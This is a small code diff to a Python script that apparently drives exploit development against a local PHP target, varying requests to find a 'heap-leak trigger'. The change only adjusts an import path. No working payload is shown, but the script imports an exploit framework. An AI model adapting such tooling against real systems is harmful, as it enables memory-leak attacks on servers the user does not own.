@@ -1,7 +1,8 @@
 #!/usr/bin/env python3
 """8.5.11: vary the priming (reqA) shape + reqB field layout to find the heap-leak trigger."""
+import os
 import sys, time, struct, re, urllib.parse
-sys.path.insert(0, r"C:\Users\likat\p2s52704")
+sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
 from exploit import Target, Exploit, build_multipart
 
 t = Target("http://127.0.0.1:18114/index.php", timeout=90.0, verbose=False)
